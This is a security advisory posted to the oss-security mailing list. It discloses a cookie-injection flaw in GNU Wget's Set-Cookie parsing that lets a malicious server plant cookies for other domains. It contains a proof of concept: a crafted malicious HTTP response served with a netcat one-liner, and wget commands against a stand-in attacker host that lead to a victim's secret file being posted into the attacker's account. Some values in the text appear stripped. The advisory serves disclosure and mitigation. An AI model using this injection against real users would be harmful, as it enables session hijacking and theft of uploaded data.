  oss-security - GNU Wget Cookie Injection            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Sun, 6 May (EEST) From: Harry Sintonen <sintonen@....fi> To: oss-security@...ts.openwall.com Subject: GNU Wget Cookie Injection  GNU Wget Cookie Injection ========================================= The latest version of this advisory is available at: https://sintonen.fi/advisories/gnu-wget-cookie-injection.txt   Overview --------  GNU Wget is susceptible to a malicious web server injecting arbitrary cookies to the cookie jar file.   Description -----------  Normally a website should not be able to set cookies for other domains. Due to insufficient input validation GNU Wget can be tricked into storing arbitrary cookie values to the cookie jar file, bypassing this security restriction.   Impact ------  An external attacker is able to inject arbitrary cookie values cookie jar file, adding new or replacing existing cookie values.   Details -------  The discovered vulnerability, described in more detail below, enables the attack described here in brief.  1. The attacker controlled web site sends a specially crafted Set-Cookie -header     to inject a new authentication cookie for example.com, replacing the existing     one. In order to be successful the victim must perform a wget operation on the     attacker controller site, for example:     wget --load-cookies jar.txt --save-cookies jar.txt https://evil.invalid 2. Victim uses wget to post some secret the the api.example.com:     wget --load-cookies jar.txt --post-file secret.txt https://example.com/upload  Since the attacker was able to replace the authentication cookie for example.com, the secret.txt data will be posted to attacker's account instead to that of the victim.   Vulnerabilities ---------------  1. CWE-20: Improper Input Validation in Set-Cookie parsing  The cookie parsing implementation does too lax input validation when parsing the Set-Cookie response from the server. Consider the following malicious response:  HTTP/1.1 OK Content-Length: 0 Set-Cookie: foo="bar    	";expires=Thursday, GMT   When parsed by Wget and stored to a cookie jar file it will appear as:  # HTTP cookie file. # Generated by Wget on # Edit at your own risk.     	"  Since the Wget cookie jar parser skips any leading spaces, the .google.com line will be picked up.  Note: The order in which the hosts/domains are stored in the cookie jar is derived from the hashing function used to speed up the lookups. If an existing cookie is to be replaced the server hostname used to serve the Set-Cookie will need to be carefully chosen to result in hash entry below the targeted domain. If not done, the original cookie will be used instead of the injected one.   Proof of Concept ----------------  1. Set up a minimal web server, good for 1 request:   $ echo -ne 'HTTP/1.1 OK\r\nContent-Length: 0\r\nSet-Cookie: GMT\r\n\r\n' | nc -v -l  2. Fetch the evil url:   $ wget --save-cookies jar.txt  3. Examine the resulting cookie jar file:   $ cat jar.txt   Vulnerable versions -------------------  The following GNU Wget versions are confirmed vulnerable:  - 1.7 thru   Mitigation ----------  1. Upgrade to GNU Wget or later, or to appropriate security updated package     in your distribution   Credits -------  The vulnerability was discovered by Harry Sintonen / F-Secure Corporation.   Timeline --------   discovered & reported the vulnerability  assigned  GNU Wget released with the fix  public disclosure of the advisory  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      